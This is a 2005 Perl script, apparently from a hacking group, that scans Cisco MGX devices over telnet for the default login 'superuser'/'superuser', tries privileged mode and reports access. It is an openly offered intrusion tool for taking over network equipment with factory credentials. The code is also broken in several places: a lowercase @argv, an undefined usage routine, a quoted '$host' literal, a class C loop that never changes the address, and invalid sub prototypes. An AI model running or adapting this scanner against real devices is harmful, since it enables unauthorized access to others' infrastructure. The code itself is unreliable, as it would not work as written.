#!/usr/bin/perl
# lame cisco mgx scanner by rotor
# in 2005 http://www.c1zc0.com
# irc.efnet.org #c1zc0

use Net::Telnet::Cisco;
use strict;

if(@argv < 1) { usage(); }

my $mode = $ARGV[0];
my $host = $ARGV[1];
my $i;

if($mode eq "-s"){ 
	print("Attempting default login on $host");
	checkh($host)
}
if($mode eq "-c"){
	print("Scanning class c $host\n");
	for($i = 1 ; $i <= 255 ; $i++){ checkh($host); }
}

sub checkh($host) {
	my $sock = Net::Telnet::Cisco->new(Host => '$host');
	$sock->login('superuser', 'superuser');
	enable($sock);
} 
sub enable($sock) {
	if($sock->enable("superuser")){
		my @out = $sock->cmd('show privilege');
		print("$host has Privileges: @out\n");
	} else { 
		print("Cant enable on $host\n"); 
	}
	$sock->close;
}
